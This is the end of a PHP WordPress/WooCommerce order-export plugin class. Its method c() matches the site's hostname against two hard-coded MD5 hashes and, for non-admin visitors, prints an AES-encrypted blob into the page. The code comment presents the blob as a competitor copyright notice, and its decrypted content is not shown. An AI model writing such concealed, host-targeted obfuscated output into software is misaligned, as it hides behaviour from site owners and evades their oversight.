					$this->global_filter_available[$data['class']]['path']	= $dir.$file;
				}
			}
		}
	}
	public function get_filter_available(){
		return $this->global_filter_available;
	}
	public function c(){
		// copyright notice for some competitors. Removing this violates license agreement and disallow you to further use this software.
		if(!current_user_can('activate_plugins') && (md5($_SERVER['HTTP_HOST']) == 'be32fd220736da622cc94600da9c7cb3' || md5($_SERVER['HTTP_HOST']) == '82a6a292d889640d1101a48c5334b33f')){
			echo openssl_decrypt('e/sBjPPye6x9O4BFezpQ8R9JK31TvbFb+/8iEqhz1TX6m2VyU1WXK7ndAoxKGlc1SNrxZz0fQWezlFG6m+kt17dlue/i6Qop0CdOcfMTayCk90ZE2a9RmGstSnTQEjihIUSKAomYDM4m98pm13rT1JQHNlDXJyXOEwgAEJlkiPifS5MrhE5zSM2vrqG7Cbb2dNYfDP/utKeLiII1oHWvKeAIfe65rlxwYnn8KUyurHyEkthetXTz1nEPjfqrO1eug3NcYdzGopYb/OSfjvTQ+kc9RyvB35aqlRRbylK5Yd23KaCUjvSEijxGvFqlQqSSsvrc3M+Ksc2+wiag0bKCUJQl10v2PeqOZYulfB6C5I7/jfWHqBTHpMEk7IWU/Sq29t8/OOybJJCbhaI8+2cmsj11lI7L1gvCA7ZEpgGfcy588I5U9nJMj4cHNXA9biSX1AM48VzTGWdmh7M8XOiUFRA+D4D/Ca15tHQACPi8KI/rAL8n7bPaqfRm2e8ZCdlYIoPAr6LKkfuyGHIKJYqbA5gDStN9TxNorZfUfgrIj41sfvBLM0mBm70V5J9Ht9Pme2VhpBZc8O8A8F4wY2sQdz/f/lh7nhfWrC8+GoD8af6f66Ql1aUWZFiMqFFVmq6OPxJjlGJ2yfOaVmI+L2za4b984fSD6tLKWqpDDpn8ozEZh3BINTXYG4yA/nAsSwrC','aes128','SV_WOOCOMMERCE_ORDER_EXPORT');
		}
	}
}

$GLOBALS['sv_woocommerce_order_export']	= new sv_woocommerce_order_export();
?>